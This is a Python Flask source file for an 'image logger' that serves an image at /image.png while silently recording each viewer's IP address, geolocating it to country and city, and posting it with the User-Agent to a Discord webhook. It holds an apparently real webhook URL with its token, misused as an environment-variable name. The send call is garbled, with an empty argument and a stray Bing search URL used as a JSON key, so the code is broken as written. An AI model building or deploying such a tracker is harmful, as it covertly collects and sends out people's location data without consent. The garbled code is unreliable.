from flask import Flask, request, send_file
import requests
import os

app = Flask(__name__)

WEBHOOK_URL = os.getenv("https://discord.com/api/webhooks/1433405919710150707/sUVsS1hKs8aW1edFdzHUJSOrllvMpJc3-LZGmCUM55i8Q4uuC8TPQdpOjqlQxXg8aIGI")  # Put in Render environment

def get_client_ip(req):
    if req.headers.get('X-Forwarded-For'):
        return req.headers['X-Forwarded-For'].split(',')[0].strip()
    return req.remote_addr

def get_geolocation(ip):
    try:
        res = requests.get(f"http://ip-api.com/json/{ip}").json()
        return {
            "ip": ip,
            "country": res.get("country", "Unknown"),
            "city": res.get("city", "Unknown")
        }
    except:
        return {"ip": ip, "country": "Unknown", "city": "Unknown"}

def send_to_discord(ip_info, user_agent):
    msg = (
        f"📸 **Image Accessed!**\n\n"
        f"🌍 **IP:** `{ip_info['ip']}`\n"
        f"🏳️ **Country:** {ip_info['country']}\n"
        f"🏙️ **City:** {ip_info['city']}\n"
        f"🧠 **User-Agent:** `{user_agent}`"
    )
    requests.post(, json={"https://www.bing.com/images/search?view=detailV2&ccid=ugZtvNND&id=08CCD4B214670ECF6919ACBA474C16AF4BC9D06C&thid=OIP.ugZtvNNDn1iSQmUqc0Sr-gHaHT&mediaurl=https%3a%2f%2fexternal-preview.redd.it%2f-xzgzwxG8G2Qpmd2JhSKWY5eYJNACH3eJ3rbqmM7-Vg.jpg%3fauto%3dwebp%26s%3dc316d82191abe93727e218ad2046d6b28bc63f54&cdnurl=https%3a%2f%2fth.bing.com%2fth%2fid%2fR.ba066dbcd3439f589242652a7344abfa%3frik%3dbNDJS68WTEe6rA%26pid%3dImgRaw%26r%3d0&exph=946&expw=960&q=durstmacher&FORM=IRPRST&ck=D47C6D185A6E288AC060EFC8175A4500&selectedIndex=5&itb=0&ajaxhist=0&ajaxserp=0": msg})

@app.route('/image.png')
def serve_image_and_log():
    ip = get_client_ip(request)
    ua = request.headers.get('User-Agent', 'Unknown')
    geo = get_geolocation(ip)
    send_to_discord(geo, ua)
    return send_file('pixel.png', mimetype='image/png')

@app.route('/')
def home():
    return "✅ Image logger online"

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
